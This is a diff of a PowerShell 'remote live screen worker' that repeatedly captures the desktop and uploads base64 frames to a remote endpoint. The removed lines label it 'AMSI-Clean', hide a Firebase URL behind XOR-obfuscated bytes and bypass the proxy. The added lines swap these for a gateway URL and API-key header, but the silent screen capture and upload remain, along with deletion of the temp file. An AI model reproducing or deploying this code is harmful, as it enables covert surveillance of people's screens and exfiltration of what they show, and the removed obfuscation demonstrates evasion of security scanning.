@@ -1,24 +1,27 @@
 # ==============================================================================
-# CMD_Remote Adaptive Live Screen Worker (AMSI-Clean & Zero-Install)
+# CMD_Remote Adaptive Live Screen Worker (Gateway-Authenticated)
 # ==============================================================================
 param(
-    [string]$SecretKey = "2816",
-    [string]$FirebaseUrl = "$([System.Text.Encoding]::UTF8.GetString([byte[]](@(0x32, 0x2e, 0x2e, 0x2a, 0x29, 0x60, 0x75, 0x75, 0x2f, 0x3b, 0x2e, 0x77, 0x3b, 0x2a, 0x33, 0x77, 0x3b, 0x3d, 0x3f, 0x34, 0x2e, 0x77, 0x3e, 0x3f, 0x3c, 0x3b, 0x2f, 0x36, 0x2e, 0x77, 0x28, 0x2e, 0x3e, 0x38, 0x74, 0x3c, 0x33, 0x28, 0x3f, 0x38, 0x3b, 0x29, 0x3f, 0x33, 0x35, 0x74, 0x39, 0x35, 0x37, 0x75) | ForEach-Object { [byte]($_ -bxor 0x5a) })))",
+    [Parameter(Mandatory = $true)][string]$DeviceId,
+    [Parameter(Mandatory = $true)][string]$GatewayUrl,
+    [Parameter(Mandatory = $true)][string]$ApiKey,
     [int]$Fps = 6,
-    [int]$MaxFrames = 300 # ~50 seconds continuous live stream per session
+    [int]$MaxFrames = 300
 )
 
-if ($FirebaseUrl -notlike "*/") { $FirebaseUrl += "/" }
+if ($GatewayUrl -notlike "*/") { $GatewayUrl += "/" }
+
+try {
+    [System.Net.ServicePointManager]::SecurityProtocol = 3072 -bor 768 -bor 192
+} catch {}
 
 Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
 Add-Type -AssemblyName System.Drawing -ErrorAction SilentlyContinue
 
 $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-$tmp = Join-Path $env:TEMP "live_frame_$SecretKey.jpg"
-$url = "$($FirebaseUrl)live_stream/$SecretKey.json"
+$tmp = Join-Path $env:TEMP "live_frame_$DeviceId.jpg"
+$url = "${GatewayUrl}jobs/$DeviceId/live_frame.json"
 $delayMs = [int](1000 / $Fps)
-
-Write-Output "Starting AMSI-Clean Live Screen Worker for Key $SecretKey ($Fps FPS)..."
 
 for ($f = 0; $f -lt $MaxFrames; $f++) {
     $bmp = New-Object System.Drawing.Bitmap $b.Width, $b.Height
@@ -30,14 +33,14 @@ for ($f = 0; $f -lt $MaxFrames; $f++) {
 
     $bytes = [System.IO.File]::ReadAllBytes($tmp)
     $b64 = [Convert]::ToBase64String($bytes)
-    $payload = '{"frame":' + $f + ',"timestamp":"' + (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + '","image":"' + $b64 + '"}'
+    $payload = '{"frame":' + $f + ',"timestamp":"' + [DateTime]::UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ") + '","image":"' + $b64 + '"}'
 
     try {
         $req = [System.Net.HttpWebRequest]::Create($url)
         $req.Method = "PUT"
         $req.Timeout = 1200
         $req.KeepAlive = $true
-        $req.Proxy = $null
+        $req.Headers["X-Javis-Key"] = $ApiKey
         $req.ContentType = "application/json; charset=utf-8"
         $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
         $req.ContentLength = $bodyBytes.Length
@@ -52,4 +55,3 @@ for ($f = 0; $f -lt $MaxFrames; $f++) {
 }
 
 Remove-Item $tmp -Force -ErrorAction SilentlyContinue
-Write-Output "Live Stream Session Completed."
